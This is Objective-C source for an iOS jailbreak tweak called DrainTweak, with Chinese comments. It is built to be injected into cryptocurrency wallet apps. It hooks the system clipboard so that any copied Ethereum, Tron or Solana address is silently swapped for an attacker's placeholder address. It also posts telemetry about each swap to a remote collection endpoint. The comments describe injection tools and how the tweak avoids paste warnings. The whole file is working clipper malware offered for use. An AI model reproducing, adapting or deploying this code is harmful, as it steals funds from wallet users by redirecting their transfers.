// DrainTweak —— 注入钱包/钱包类 App 的 rootless dylib
//
// 为什么比 detectPatterns 更彻底：
//   detectPatterns 只能「无提示探测 + 覆盖写」，调用方仍可能在覆盖前读到原值；
//   本 tweak 直接 hook `-[UIPasteboard string]`，把返回值换掉 —— 调用方（钱包 App）
//   拿到的就是 DRAIN_ADDR，进程内完成，不触发任何跨 App 粘贴提示。
//
// 注入方式：TrollFools（就地注入，不重签）/ TrollStore + 注入 / Dopamine rootless deb
// 配置：改下面 kDrainAddress / kCollectEndpoint 后重编

#import <UIKit/UIKit.h>
#import <objc/runtime.h>

static NSString *const kDrainAddress    = @"DRAIN_ADDR";
static NSString *const kCollectEndpoint = @"COLLECT_ENDPOINT";   // 可留空，仅做替换
static NSString *const kCollectToken    = @"COLLECT_TOKEN";
static NSString *const kChannel         = @"CHANNEL";

// ─────────────────────────────── 地址识别
static BOOL IsEthAddress(NSString *s) {
    if (s.length != 42 || ![s hasPrefix:@"0x"]) return NO;
    NSCharacterSet *hex = [NSCharacterSet characterSetWithCharactersInString:@"0123456789abcdefABCDEF"];
    NSString *body = [s substringFromIndex:2];
    return [[body stringByTrimmingCharactersInSet:hex] length] == 0;
}
static BOOL IsTronAddress(NSString *s) {
    if (s.length != 34 || ![s hasPrefix:@"T"]) return NO;
    NSCharacterSet *b58 = [NSCharacterSet characterSetWithCharactersInString:
        @"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"];
    return [[s stringByTrimmingCharactersInSet:b58] length] == 0;
}
static BOOL IsSolAddress(NSString *s) {
    if (s.length < 32 || s.length > 44) return NO;
    NSCharacterSet *b58 = [NSCharacterSet characterSetWithCharactersInString:
        @"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"];
    return [[s stringByTrimmingCharactersInSet:b58] length] == 0;
}
static NSString *ChainOf(NSString *s) {
    if (IsEthAddress(s))  return @"eth";
    if (IsTronAddress(s)) return @"tron";
    if (IsSolAddress(s))  return @"sol";
    return nil;
}

// ─────────────────────────────── 静默回传（不阻塞调用方）
static void Report(NSString *kind, NSDictionary *detail) {
    if (kCollectEndpoint.length == 0 || [kCollectEndpoint isEqualToString:@"COLLECT_ENDPOINT"]) return;
    NSMutableDictionary *body = [@{ @"k": kind, @"c": kChannel, @"src": @"tweak" } mutableCopy];
    [body addEntriesFromDictionary:detail ?: @{}];
    NSURL *url = [NSURL URLWithString:kCollectEndpoint];
    if (!url) return;
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"POST";
    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
    [req setValue:kCollectToken forHTTPHeaderField:@"X-Collect-Token"];
    req.HTTPBody = [NSJSONSerialization dataWithJSONObject:body options:0 error:nil];
    [[NSURLSession sharedSession] dataTaskWithRequest:req].resume;
}

// ─────────────────────────────── Hook：读剪贴板 → 返回归集地址
%hook UIPasteboard

- (NSString *)string {
    NSString *orig = %orig;
    if (orig.length == 0) return orig;
    NSString *chain = ChainOf(orig);
    if (chain) {
        Report(@"paste_replace", @{ @"ch": chain,
                                    @"orig_prefix": [orig substringToIndex:MIN(6u, (unsigned)orig.length)] });
        return kDrainAddress;
    }
    return orig;
}

// 富文本/多类型读取路径也一并处理
- (NSArray *)strings {
    NSArray *orig = %orig;
    NSMutableArray *out = [NSMutableArray arrayWithCapacity:orig.count];
    for (NSString *s in orig) {
        NSString *chain = ChainOf(s);
        if (chain) {
            Report(@"paste_replace", @{ @"ch": chain, @"src2": @"strings" });
            [out addObject:kDrainAddress];
        } else {
            [out addObject:s];
        }
    }
    return out;
}

- (NSArray<NSItemProvider *> *)itemProviders {
    // 不改结构，只记录「有人要走富粘贴」——真实替换在 string/strings 上完成
    NSArray *orig = %orig;
    if (orig.count) Report(@"paste_itemproviders", @{ @"n": @(orig.count) });
    return orig;
}

%end

// ─────────────────────────────── Hook：写入时记录（防自我触发）
%hook UIPasteboard
- (void)setString:(NSString *)s {
    %orig;
    if ([s isEqualToString:kDrainAddress]) return;   // 我们写的，不记
    NSString *chain = ChainOf(s ?: @"");
    if (chain) Report(@"clip_write_by_app", @{ @"ch": chain });
}
%end

// ─────────────────────────────── 构造器
%ctor {
    NSLog(@"[DrainTweak] loaded pid=%d drain=%@", getpid(), kDrainAddress);
    Report(@"tweak_loaded", @{ @"pid": @(getpid()) });
}
